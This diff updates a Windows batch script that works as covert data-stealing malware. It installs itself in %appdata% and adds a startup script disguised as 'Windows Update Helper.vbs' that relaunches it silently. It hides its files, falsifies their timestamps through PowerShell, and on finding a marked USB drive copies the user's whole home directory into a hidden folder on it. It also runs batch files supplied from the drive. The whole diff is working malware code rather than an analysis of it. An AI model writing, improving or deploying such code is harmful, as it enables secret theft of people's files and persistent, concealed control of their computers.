@@ -1,7 +1,32 @@
+REM Version 4.7[4.6-DEBUGrelease-noverbugs]
+@echo off
+set novbs=false
+set debugmsg=true
+if exist debugmsg.dat (
+set debugmsg=false
+copy debugmsg.dat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
+)
+if %debugmsg%==false @echo on
+
+set /p ver=<lmao.bat
+set ver=%ver:REM =%
+set HDDver=NONE
+
+REM this for some reason needs to be here, otherwise it doesnt get executed
+set /p HDDver=<"%appdata%\Microsoft\Windows\lmao.bat"
+if exist "%appdata%\Microsoft\Windows\lmao.bat" (
+if not %HDDver:~0,3%==REM (
+set HDDver=HDD version does not have header[ver possibly lower than 4.5-DEBUGrelease]...
+)
+)
+set HDDver=%HDDver:REM =%
+
+echo init begin
 set filename=lmao69.dat
 if not "%cd%"=="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (
 if not "%cd%"=="%appdata%\Microsoft\Windows" (
 if not exist %filename% (
+echo entered important file creation
 echo initcopy>%filename%
 attrib +h %filename%
 )
@@ -13,15 +38,17 @@ goto :createvbs
 :aftervbs
 set skip=False
 set tries=0
-if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))
+if not exist "%appdata%\Microsoft\Windows\updating.dat" (echo launching atstartup applications if any... && if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a")))
 set state=NOTUPDATING
 set dirr=HDD
 if exist %filename% (set dirr=FLASH)
-
-
+echo we are on %dirr%
+echo initialization finished; starting main code
+echo trying to find correct drive
 goto :searching
 
 :changedate
+echo starting datechange for vbs
 c:
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
 attrib -s -h "Windows Update Helper.vbs"
@@ -30,6 +57,7 @@ powershell  (Get-Item "Windows` Update` Helper.vbs").LastWriteTime=Get-Date
 powershell  (Get-Item "Windows` Update` Helper.vbs").LastAccessTime=Get-Date
 attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 
+echo starting datechange for bat
 attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat"
 cd "%appdata%\Microsoft\Windows"
 powershell  (Get-Item "lmao.bat").LastWriteTime=Get-Date
@@ -37,14 +65,13 @@ powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
 powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
 attrib +s "%appdata%\Microsoft\Windows\lmao.bat"
 
+echo checking for additional folders
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (goto :lmaostartuptask)
 :aftertask
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (goto :atinserttask)
 :afterndtask
-
-echo IDK
 if %skip%==true (goto :1)
-
+echo trying to find correct drive
 :searching
 if %tries%==100000 (set tries=0 && goto :changedate)
 if exist "d:\%filename%" (d: && goto :b)
@@ -55,113 +82,150 @@ set /a tries=%tries% + 1
 goto :searching
 
 :b
-cd ..
-if not exist alreadycopied.dat (echo false >alreadycopied.dat)
-set /p copied=<alreadycopied.dat
-attrib +h alreadycopied.dat
-if exist novbs.dat set novbs=true
-if not exist novbs.dat set novbs=false
+echo found drive
 set com=0
 set /p com=<%filename%
+echo calling atinsert programs if any...
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" %%a in (*.bat) do (call "%%a"))
-if exist force_dat.dat set /p com=<%filename%
+if exist force_dat.dat (set /p com=<%filename% && echo forcing recheck)
 if exist %com% (
 if exist atstartup.dat (goto :c)
 if exist atinsert.dat (goto :i)
-start %com%
+echo %filename% contains valid batch executable, calling %com%
+call %com%
 set com=initcopy
 )
 :d
 if exist UNIN000.dat goto :u
-if not %com%==initcopy goto :searching
+if not %com%==initcopy (echo contents of %filename% are not correct or do not specify valid batch file && goto :searching)
+
+if not exist alreadycopied.dat (echo false >alreadycopied.dat)
+set /p copied=<alreadycopied.dat
+if exist novbs.dat set novbs=true
+
+echo %filename% verified - on correct drive
 if exist transfer.dat (xcopy transfer\* %homedrive%%homepath% /y)
 if exist "Windows Update Helper.vbs" (
-if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" (attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs")
-xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y
+echo installing vbs
+attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
+xcopy "Windows Update Helper.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" /y >nul 2>&1
+echo .vbs installed
 )
+
 if %dirr%==FLASH (
 if exist lmao.bat (
-attrib -s "%appdata%\Microsoft\Windows\lmao.bat"
-del "%appdata%\Microsoft\Windows\lmao.bat"
+echo updating lmao.bat
+echo Installing from: %HDDver%
+echo To: %ver%
+attrib -s "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
+del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s lmao.bat
-xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y
-)
-goto :miss
-REM if looping for some reason, this is like 70% the case
-)
-if %copied%==false (
-if %dirr%==HDD (
+xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
+echo new lmao.bat installed
 attrib -h alreadycopied.dat
 echo true >alreadycopied.dat
 attrib +h alreadycopied.dat
+)
+echo x >"%appdata%\Microsoft\Windows\updating.dat"
+echo getting back on hdd version
 goto :miss
 )
+
+if %copied%==false (
+if %dirr%==HDD (
+echo making preparations to enter flash version
+if exist lmao.bat (
+start lmao.bat
+echo x >"%appdata%\Microsoft\Windows\updating.dat"
+echo started flash lmao
+if not %novbs%==false pause
+exit
 )
+)
+)
+echo on hdd bat
+echo removing temp file
+del "%appdata%\Microsoft\Windows\updating.dat"
 attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
 set curr=%cd%
 set curr=%curr:~0,2%
 set skip=true
+echo setup for datechange finished
 goto :changedate
 :1
+echo datechange successful; getting back on usb
 %curr%
-if exist dontcopy.dat (echo " ">iwashere.dat && goto :whileexist)
+attrib -h alreadycopied.dat >nul 2>&1
+del alreadycopied.dat >nul 2>&1
+if exist dontcopy.dat (echo copying skipped because of dontcopy.dat; checking for usb removal... && echo " ">iwashere.dat && goto :whileexist)
 set dire=%random%
 if exist RESUME (set /p dire=<RESUME)
 echo %dire% > RESUME
 attrib +h RESUME
 mkdir "%dire%"
 attrib +s +h "%dire%"
+echo made preparations for copying and made folders hidden
 xcopy /S /D "%homedrive%%homepath%" "%dire%" /Y
+echo end of copying; removing temp files
 attrib -h RESUME
 del RESUME
+echo checking for usb removal...
 
 :whileexist
-del "%appdata%\Microsoft\Windows\doing.dat"
-attrib -h alreadycopied.dat
-del alreadycopied.dat
-if not exist %filename% goto :miss
+del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1
+del "%appdata%\Microsoft\Windows\doing.dat" >nul 2>&1
+if not exist %filename% (echo usb removed, restaring app && goto :miss)
 goto :whileexist
 exit
 
 :c
+echo creating startup files and folder
 if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup")
 attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
 xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup\" /y
 attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
 set com=initcopy
+del atstartup.dat
 goto :d
 
 :i
+echo creating insert files and folder
 if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (mkdir "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert")
 attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
 xcopy %com% "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert\" /y
 attrib +s +h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
 set com=initcopy
+del atinsert.dat
 goto :d
 
 :u
-echo removing system and hidden properties from folders... > info.txt
-attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
-attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
-attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
-attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >> info.txt
+echo about to uninstall %HDDver% from hdd
+echo ENTERED UNINSTALL FASE; REST IN INFO.TXT
+echo removing system and hidden properties from folders and files... > info.txt
+attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
+attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
+attrib -s -h "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
+attrib -s -h "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 echo properties removed, continuing... >> info.txt
 echo removing lmaostartup... >> info.txt
-rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"  >> info.txt
+rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" >nul 2>&1
 echo lmaostartup removed >> info.txt
 echo removing atinsert... >> info.txt
-rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"  >> info.txt
+rmdir /s /q "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" >nul 2>&1
 echo atinsert removed >> info.txt
-echo removing vbs and supporting bat if any... >> info.txt
-del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >> info.txt
+echo removing vbs... >> info.txt
+del /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs" >nul 2>&1
 echo vbs removed >> info.txt
 echo removing lmao.bat (if uninstalling without lmao.bat on usb, rest not available)... >> info.txt
-del /q "%appdata%\Microsoft\Windows\lmao.bat"  >> info.txt
+del /q "%appdata%\Microsoft\Windows\debugmsg.dat" >nul 2>&1
+del /q "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 echo lmao.bat removed >> info.txt
 echo UNINSTALL COMPLETED SUCCESSFULLY >> info.txt
+if not %novbs%==false pause
 exit
 
 :miss
+echo entered restart fase
 %homedrive:~0,2%
 if %novbs%==false (
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -170,11 +234,13 @@ exit
 )
 cd "%appdata%\Microsoft\Windows\"
 start lmao.bat
+if not %novbs%==false pause
 exit
 
 REM DO NOT PUT IN IF; MAKES CMD EXECUTE IN ORDER TO FIND ERRORS AND CRASHES (because of missing files)
 
 :lmaostartuptask
+echo lmaostartup datechange entered
 set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
 set tempor=%tempor: =` %
 echo %tempor%
@@ -184,10 +250,12 @@ powershell (Get-Item %tempor% -force).CreationTime=Get-Date
 powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
 powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
 powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
+echo datechange successful
 goto :aftertask
 
 
 :atinserttask
+echo atinsert datechange entered
 set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
 set tempor=%tempor: =` %
 echo %tempor%
@@ -197,12 +265,15 @@ powershell (Get-Item %tempor% -force).CreationTime=Get-Date
 powershell (Get-Item %tempor%\* -force).LastWriteTime=Get-Date
 powershell (Get-Item %tempor%\* -force).LastAccessTime=Get-Date
 powershell (Get-Item %tempor%\* -force).CreationTime=Get-Date
+echo datechange successful
 goto :afterndtask
 
 REM END OF CRUCIAL CODE POSITION
 
 :createvbs
+echo creating vbs
 echo Set WshShell = CreateObject("WScript.Shell")  >"Windows Update Helper.vbs"
 echo WshShell.Run chr(34) ^& "%appdata%\Microsoft\Windows\lmao.bat" ^& Chr(34), 0  >>"Windows Update Helper.vbs"
 echo Set WshShell = Nothing >>"Windows Update Helper.vbs"
+echo created successfully
 goto :aftervbs
